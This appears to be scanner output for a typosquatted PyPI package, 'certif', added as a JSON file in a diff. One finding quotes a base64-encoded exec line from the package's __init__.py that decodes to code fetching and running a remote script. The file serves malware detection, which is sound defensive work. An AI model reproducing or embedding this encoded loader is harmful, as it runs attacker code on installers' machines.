@@ -1,0 +1,24 @@
+{
+    "issues": 1,
+    "errors": {},
+    "results": {
+        "clipboard-access": {},
+        "dll-hijacking": {},
+        "steganography": {},
+        "shady-links": {},
+        "obfuscation": {},
+        "exfiltrate-sensitive-data": {},
+        "download-executable": {},
+        "silent-process-execution": {},
+        "cmd-overwrite": {},
+        "code-execution": {},
+        "exec-base64": [
+            {
+                "location": "certifi/__init__.py:3",
+                "code": "exec(base64.b64decode(b'ZXhlYyhfX2ltcG9ydF9fKCJpbXBvcnRsaWIiKS5pbXBvcnRfbW9kdWxlKCJ1cmxsaWIucmVxdWVzdCIpLnVybG9wZW4oImh0dHBzOi8vY3liZXJyZXNlYXJjaC5weXRob25hbnl3aGVyZS5jb20vcmVwb3J0ZXIucHkiKS5yZWFkKCkuZGVjb2RlKCkp'))\n",
+                "message": "This package contains a call to the `eval` function with a `base64` encoded string as argument.\nThis is a common method used to hide a malicious payload in a module as static analysis will not decode the\nstring.\n"
+            }
+        ]
+    },
+    "path": "./dataset/pypi/certif-2022.9.24"
+}
